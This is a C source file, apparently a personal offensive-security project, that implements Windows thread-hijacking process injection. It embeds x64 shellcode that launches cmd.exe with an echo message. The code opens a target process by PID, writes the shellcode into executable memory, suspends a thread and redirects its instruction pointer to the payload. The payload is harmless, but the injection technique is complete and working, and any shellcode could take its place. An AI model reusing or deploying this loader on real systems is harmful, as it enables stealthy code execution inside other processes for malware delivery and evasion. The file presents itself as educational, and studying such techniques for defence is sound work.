/*
>* Threadhijacking *<

@author:  bekoo 
@website: 0xbekoo.github.io
@warning: This project has been developed for educational purposes only. Its use in real scenarios is at one's own risk. 

*/
#include <Windows.h>
#include <TlHelp32.h>
#include <WtsApi32.h>
#include <stdio.h>
#include <stdlib.h>

/* 
    cmd /K "echo ThreadHijacking with bekoo"
*/
char Shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x4b\x20\x22\x65"
"\x63\x68\x6f\x20\x54\x68\x72\x65\x61\x64\x68\x69\x6a\x61"
"\x63\x6b\x69\x6e\x67\x20\x77\x69\x74\x68\x20\x62\x65\x6b"
"\x6f\x6f\x22";

HANDLE FindThreadTID(DWORD TargetProcessPID) {
	HANDLE Snapshot = NULL;
	HANDLE HandleThread = NULL;
	THREADENTRY32 ThreadEntry;
	ZeroMemory(&ThreadEntry, sizeof(THREADENTRY32));


	Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (Snapshot == 0) {
		printf("Failed to get Snapshot! Error Code: 0x%lx\n", GetLastError());
		return -1;
	}
	ThreadEntry.dwSize = sizeof(THREADENTRY32);

	while (Thread32Next(Snapshot, &ThreadEntry)) {
		if (ThreadEntry.th32OwnerProcessID == TargetProcessPID) {
			HandleThread = OpenThread(THREAD_ALL_ACCESS, FALSE, ThreadEntry.th32ThreadID);
			if (HandleThread == NULL) {
				printf("Failed to Open Thread (0x%p)! Error Code: 0x%lx\n", GetLastError());
				continue;
			}
			return HandleThread;
		}
	}
	return NULL;
}

int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("[-] .\\program.exe <PID>\n");
		return -1;
	}
	DWORD		PID 		= atoi(argv[1]);
	HANDLE		HandleProcess	= NULL;
	HANDLE		HandleThread	= NULL;
	LPVOID		PayloadAddress	= NULL;
	HMODULE		NTDLLADDRESS	= NULL;
	size_t		BytesWritten	= 0;
	CONTEXT		ContextThread;
	ContextThread.ContextFlags 	= CONTEXT_FULL;

	NTDLLADDRESS = GetModuleHandleA("ntdll.dll");
	if (NTDLLADDRESS == NULL) {
		printf("Failed to get NTDLL Address! Error Code: 0x%lx\n", GetLastError());
		return -1;
	}

	HandleProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (HandleProcess == NULL) {
		printf("Failed to Open Process! Error Code: 0x%lx\n", GetLastError());
		return -1;
	}

	PayloadAddress = VirtualAllocEx(HandleProcess, NULL, sizeof(Shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (PayloadAddress == NULL) {
		printf("Failed to Allocate Memory! Error Code: 0x%lx\n", GetLastError());
		CloseHandle(HandleProcess);
		return -1;
	}

	if (!(WriteProcessMemory(HandleProcess, PayloadAddress, Shellcode, sizeof(Shellcode), &BytesWritten))) {
		printf("Failed to write shellcode! Error Code: 0x%lx\n", GetLastError());
		return -1;
	}

	HandleThread = FindThreadTID(PID);
	SuspendThread(HandleThread);
	GetThreadContext(HandleThread, &ContextThread);

	ContextThread.Rip = (DWORD_PTR)PayloadAddress;
	SetThreadContext(HandleThread, &ContextThread);
	ResumeThread(HandleThread);
	return 0;
}
